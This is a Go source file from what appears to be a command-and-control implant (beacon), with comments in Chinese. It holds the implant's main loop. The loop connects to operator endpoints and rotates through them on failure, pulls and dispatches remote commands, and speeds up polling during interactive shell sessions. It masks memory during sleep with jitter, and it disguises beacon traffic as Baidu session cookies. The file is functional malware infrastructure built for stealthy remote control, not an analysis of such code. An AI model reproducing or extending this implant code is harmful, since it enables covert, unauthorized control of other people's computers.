package main

import (
	"implant/core/app"
	"implant/core/commands"
	"implant/core/communication"
	"implant/core/config"
	"implant/core/debuglog"
	"implant/core/reconnect"
	"math/rand"
	"time"
)

// fastPollInterval 交互式终端活跃时使用的轮询间隔。
//
// 轮询传输下"一个字符 = 一条命令 = 一轮 GET"，按信标节奏（sleep，常见 5s）轮询
// 会让终端像哑终端：敲 5 个字符要等 25 秒。本机确实有交互会话时降到 150ms，
// 会话结束立即回落——只在这段时间多付请求频率，而不是全程。
const fastPollInterval = 150 * time.Millisecond

// fastPollActive 记录当前是否处于"交互会话快轮询"状态，只用于状态切换时打一行
// 日志（否则每 150ms 一条日志会把客户端日志刷满）。
var fastPollActive bool

// heartbeatStarter 由需要独立心跳的传输实现（内部管理 ticker，重连时先停旧再起新）
type heartbeatStarter interface {
	StartHeartbeat()
}

// pollTransport 由轮询型传输（HTTP/OSS/DNS）实现：返回轮询间隔；
// 持久传输不实现，空闲时按 WaitTime 抖动休眠
type pollTransport interface {
	PollInterval() time.Duration
}

// transportClient 单二进制对传输的统一视图：Transport 能力 + 连接状态 + 重连管理器
type transportClient interface {
	communication.Transport
	IsConnected() bool
	ReconnectMgr() *reconnect.ReconnectManager
}

// httpGetMetadataPrepend 必须与服务端 config.Http_get_metadata_prepend 完全一致
// （服务端用 strings.TrimPrefix 去掉它以取 MetaInfo）。http 与 https 共用，
// 放在无 build tag 的共享文件里 —— 两个传输文件各自声明会在多传输构建下重名。
const httpGetMetadataPrepend = "BDUSS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE; BDUSS_BFESS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE;SESSIONID="

// ===== 传输注册表 =====
//
// 单传输构建：只有一个 transport 文件被编译，它的 init 把构造器注册进来。
// 多传输构建（-tags transport_multi）：全部 12 个文件都编译，注册表里有全部构造器，
// 由 multiTransport 按 endpoint 的 scheme 选择实现。

// listenerType 当前传输类型（日志与 FirstBlood 用）。单传输构建由各 init 设为自身类型；
// 多传输构建在每次 Connect 时更新为实际使用的 scheme。
var listenerType = "tcp"

var transportRegistry = map[string]func() transportClient{}

// registerTransport 由各 transport 文件的 init 调用
func registerTransport(name string, ctor func() transportClient) {
	transportRegistry[name] = ctor
}

// newMultiTransportFn 仅多传输构建下由 transport_multi.go 赋值
var newMultiTransportFn func() transportClient

// NewTransport 构造传输实例：多传输构建返回调度器，单传输构建返回注册表里唯一那个
// （TCP/KCP 等持久传输在 Connect 内完成心跳与密钥设置）。
func NewTransport() transportClient {
	if newMultiTransportFn != nil {
		return newMultiTransportFn()
	}
	for _, ctor := range transportRegistry {
		return ctor()
	}
	return nil
}

// underlyingProvider 由 multiTransport 实现：返回当前实际使用的传输，
// 供 runloop 判断它是轮询型还是持久型（接口是静态的，multiTransport 自己
// 不能"有时实现有时不实现"）。
type underlyingProvider interface {
	Underlying() transportClient
}

// activeTransport 解包多传输调度器
func activeTransport(c transportClient) transportClient {
	if up, ok := c.(underlyingProvider); ok {
		if u := up.Underlying(); u != nil {
			return u
		}
	}
	return c
}

// runLoop 单二进制共享主循环（原各 adapter 重复的 runLoop 收敛于此）：
// 连接 → 心跳 → 拉取命令 → 派发 → 空闲休眠；失败时指数退避重连并轮转 endpoint。
func runLoop() {
	host := app.CurrentEndpoint()
	client := NewTransport()
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	recvFailCount := 0
	for {
		if !client.IsConnected() {
			if !client.ReconnectMgr().CanAttemptReconnect() {
				time.Sleep(30 * time.Second)
				continue
			}
			time.Sleep(client.ReconnectMgr().GetNextDelay())
			if err := client.Connect(host); err != nil {
				host = app.AdvanceEndpoint()
				recvFailCount = 0
				debuglog.Printf("❌ [%s] 连接失败: %v\n", listenerType, err)
				continue
			}
			communication.SetTransport(client)
			// 持久传输在 Connect 内已启动心跳；轮询/独立心跳在此兜底启动。
			// 多传输构建下要解包到实际传输再判断（调度器本身不实现心跳接口）。
			if hs, ok := activeTransport(client).(heartbeatStarter); ok {
				hs.StartHeartbeat()
			}
		}

		data, err := client.Recv()
		if err != nil {
			recvFailCount++
			debuglog.Printf("❌ [%s] 读取失败: %v，将重连 (连续失败 %d 次)\n", listenerType, err, recvFailCount)
			// 通道连续失败（≥3 次）时轮转 endpoint，避免死守坏服务器
			if recvFailCount >= 3 {
				recvFailCount = 0
				host = app.AdvanceEndpoint()
				debuglog.Printf("🔄 [%s] 通道连续失败，切换到下一个 endpoint: %s\n", listenerType, host)
			}
			continue
		}
		recvFailCount = 0

		if data != nil {
			app.HandleCommand(data)
			continue
		}

		// 空闲休眠：轮询型按 PollInterval，持久型按 WaitTime；**两者都走 sleep mask**
		// （原实现持久型走无遮蔽的 SleepWithJitter，而长连接的密钥驻留时间最长）
		if pt, ok := activeTransport(client).(pollTransport); ok {
			interval := pt.PollInterval()
			if interval < 1000*time.Millisecond {
				interval = config.WaitTime // 防御：传输未给有效间隔时回退 sleep 基准
			}
			// 交互式终端活跃 → 快轮询（见 fastPollInterval）。用会话活跃状态而不是
			// 操作员开关：终端一关，下一轮就自动回落到信标节奏。
			if commands.InteractiveShellActive() && interval > fastPollInterval {
				interval = fastPollInterval
				if !fastPollActive {
					fastPollActive = true
					debuglog.Printf("⚡ [终端] 交互会话活跃，轮询间隔降至 %v（会话结束自动恢复）\n", fastPollInterval)
				}
			} else if fastPollActive && !commands.InteractiveShellActive() {
				fastPollActive = false
				debuglog.Printf("🕐 [终端] 交互会话结束，轮询间隔恢复为 %v\n", interval)
			}
			app.SleepMask(app.Jittered(interval))
		} else {
			app.SleepMaskedWithJitter(r)
		}
	}
}

// 仅用于引用 reconnect 包（各传输的 ReconnectMgr 实现用到）
var _ = reconnect.NewReconnectManager
var _ = config.WaitTime
